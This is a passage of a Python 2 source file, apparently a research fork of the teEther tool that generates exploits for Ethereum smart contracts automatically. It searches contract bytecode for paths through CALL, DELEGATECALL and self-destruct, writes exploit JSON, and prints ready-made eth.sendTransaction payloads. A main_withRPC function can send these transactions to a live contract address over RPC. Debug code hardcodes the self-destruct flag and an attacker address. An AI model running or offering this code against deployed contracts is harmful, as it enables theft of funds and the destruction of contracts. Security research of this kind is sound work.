    #     with open(md5_path, 'rb') as f:
    #         jd = json.load(f)
    #     print ('\n\n\n$$$$$$$$$$$DEBUGG FORCE CALLEE JSON import! md5_path %s\n' % md5_path)
    #     return Project.from_json(jd)

    # this is used with old "dir" main function
    else: #using the dir method
        # cont_map = '../teether-test/eval/call_mapping'
        # cfg_dir = '../teether-test/eval/cfg/'
        cont_map = '../teether_eval/contract_mapping'
        cfg_dir = '../teether_eval/cfg/'
        # read the mapping file
        import csv
        with open(cont_map, 'rb') as csvfile:
            contreader = csv.reader(csvfile, delimiter=' ', quotechar='|')
            for row in contreader:
                if(row[1] == contract_addr):
                    md5_path = cfg_dir + row[0] + '.project.json'
                    # if md5_path.endswith('.json'):
                    with open(md5_path, 'rb') as f:
                        jd = json.load(f)
                    print ('sucsessful JSON import! md5_path %s' % md5_path)
                    return Project.from_json(jd)
            print "didn't find the address in mapping"
        print "ERROR; couldn't importJSON"
        return



def hex_encode(d):
    return {k: hexlify(v) if isinstance(v, basestring) else v for k, v in d.iteritems()}


def main(code_path, target_addr, amount, savefile=None, initial_storage_file=None, initial_balance=None, flags=None):
    #DEBUGG
    flags = {'SUICIDE'}
    print("\n ----------[     #DEBUGGflags = {'SUICIDE'} ]-----------")

    savefilebase = savefile or code_path
    if code_path.endswith('.json'):
        with open(code_path, 'rb') as f:
            jd = json.load(f)
        project = Project.from_json(jd)
    else:
        with open(code_path) as infile:
            inbuffer = infile.read().rstrip()
        code = unhexlify(inbuffer)
        project = Project(code)
        with open('%s.project.json' % savefilebase, 'w') as f:
            json.dump(project.to_json(), f)

    print("\n ----------[ %s ]-----------" % code_path)

    amount_check = '+'
    amount = amount.strip()
    if amount[0] in ('=', '+', '-'):
        amount_check = amount[0]
        amount = amount[1:]
    amount = int(amount)

    initial_storage = dict()
    if initial_storage_file:
        with open(initial_storage_file, 'rb') as f:
            initial_storage = {int(k, 16): int(v, 16) for k, v in json.load(f).iteritems()}

    # complex_flag used to look only for exploits that include an internal-call somewhere; ignoring combinations of "trivial" SymbolicResult triples
    if 'COMPLEX' in flags:
        project.complex_flag = True
        flags.remove('COMPLEX')
    else:
        project.complex_flag = False

    flags = flags or {'CALL', 'CALLCODE', 'DELEGATECALL', 'SUICIDE'}

    result = combined_exploit(project, flags, int(target_addr, 16), amount, amount_check, initial_storage, initial_balance)
    if result:

        call, r, model = result

        print model

        for i, res in enumerate(r.results):
            if (res != None):
                try:
                    if(res.addr):
                        pass
                except AttributeError:
                    res.addr = 0


        with open('%s.exploit.json' % savefilebase, 'w') as f:
            #to adjust for the new triple structure of the results I had to add an addres, xid and a spec field that will be passed through the JSON to
            # replay_exploit
            json.dump({'paths': [{'index': i, 'path': [ins for ins in res.state.trace if
                                                       ins in res.project.cfg.bb_addrs or ins == res.state.trace[-1]], 'addres': res.addr, 'xid': res.xid,
                                  'spec': res.spec } for
                                 i, res in enumerate(r.results) if (res != None)],
                       'calls': [{'index': i, 'call': hex_encode(c)} for i, c in enumerate(call)],
                       }, f)

        for i, res in enumerate(r.results):
            if (res != None):
                print '%d: %s' % (
                i, '->'.join('%x' % i for i in res.state.trace if i in res.project.cfg.bb_addrs or i == res.state.trace[-1]))
        print call
        print
        for c in call:
            #overwrite attacker controlled address for non-direct critical commands
            if c['caller'] == 0x3debc0a74cb1ed48d4282b859e91006c00808d91:
                target_addr = '0x3debc0a74cb1ed48d4282b859e91006c00808d91'

            print 'eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x4000000000000000000000000000000000000000"%s, gasPrice:0})' % (
                int(target_addr, 16), hexlify(c.get('payload', '')),
                ", value:%d" % c['value'] if c.get('value', 0) else '')
        return True
    return False

def main_withRPC(code_path, target_addr, amount, savefile=None, initial_storage_file=None, initial_balance=None, flags=None, execute_exploit=False):
    #this main function used the RPC client; you'll have to enable the first code-block in addr_to_project for the RPC to work on callee code recovery as-well

    # execute_exploit = True
    # execute_exploit = False
    # flags = {'CALL'}
    # flags = {'DELEGATECALL'}

    # manually set target addr
    if code_path == 'do_RPC':
        contract_addr = '0x4000000000000000000000000000000000000001'
        # contract_addr = '0xfc11e689bd0d61428ed4ca2bc49f28617d5cf89c'
    elif code_path.startswith('0x'): #explicit addr in args
        contract_addr = code_path

    project = addr_to_project(contract_addr)
    # with open('%s.project.json' % contract_addr, 'w') as f:
    #     json.dump(project.to_json(), f)


    print("\n ----------[ %s ]-----------" % contract_addr)

    amount_check = '+' #defult
    amount = amount.strip()
    if amount[0] in ('=', '+', '-'):
        amount_check = amount[0]
        amount = amount[1:]
    amount = int(amount)

    initial_storage = dict()

    if initial_storage_file:
        with open(initial_storage_file, 'rb') as f:
            initial_storage = {int(k, 16): int(v, 16) for k, v in json.load(f).iteritems()}

    # complex_flag used to look only for exploits that include an internal-call somewhere; ignoring combinations of "trivial" SymbolicResult triples

    if 'COMPLEX' in flags:
        project.complex_flag = True
        flags.remove('COMPLEX')
    else:
        project.complex_flag = False

    flags = flags or {'CALL', 'CALLCODE', 'DELEGATECALL', 'SUICIDE'}

    result = combined_exploit(project, flags, int(target_addr, 16), amount, amount_check, initial_storage, initial_balance)

    if result:

        call, r, model = result

        print "model: "
        print model

        for i, res in enumerate(r.results):
            if res != None:
                print '%d: %s' % (
                i, '->'.join('%x' % i for i in res.state.trace if i in res.project.cfg.bb_addrs or i == res.state.trace[-1]))
        print "call: "
        print call

        print
        for c in call:                    #int(target_addr, 16) #hexlify(c.get('payload', ''))
            # print 'Exploit: eth.sendTransaction({\n from:"0x%040x",\n data:"0x%s",\n to:"0x4000000000000000000000000000000000000001"%s,\n gasPrice:0\n})' % (
            if c['caller'] == 0x3debc0a74cb1ed48d4282b859e91006c00808d91:
                target_addr = '0x3debc0a74cb1ed48d4282b859e91006c00808d91'

            print 'Exploit: eth.sendTransaction({ from:"0x%040x", data:"0x%s", to:"%s"%s, gasPrice:0})' % (
                int(target_addr, 16),
                hexlify(c.get('payload', '')),
                contract_addr,
                ", value:%d" % c['value'] if c.get('value', 0) else ''
            )
            #RPC send transaction
            if(execute_exploit):
                resp =  sendExploit(target_addr, hexlify(c.get('payload', '')), contract_addr)

                print ("Responce: %s " % (resp))
            if (c.get('callee_payload')):
                print 'the related callee exploit: data:"0x%s"\n\n' % hexlify(c.get('callee_payload', ''))

        return True

    return False


if __name__ == '__main__':
    # limit memory to 8GB
    mem_limit = 8 * 1024 * 1024 * 1024
    try:
        rsrc = resource.RLIMIT_VMEM
    except:
        rsrc = resource.RLIMIT_AS
    resource.setrlimit(rsrc, (mem_limit, mem_limit))

    fields = ['code','target-address','amount', 'savefile', 'initial-storage', 'initial-balance']
    config = {f: None for f in fields}
    config['flags'] = set()

    field_iter = iter(fields)
    for arg in sys.argv[1:]:
        if arg.startswith('--'):
            config['flags'].add(arg[2:].upper())
        else:
            field = next(field_iter)
            config[field] = arg

    if config['amount'] is None:
        print 'Usage: %s [flags] <code> <target-address> <amount> [savefile] [initial-storage file] [initial-balance]' % sys.argv[0]
        exit(-1)

    main(config['code'], config['target-address'], config['amount'], config['savefile'], config['initial-storage'], config['initial-balance'], config['flags'])
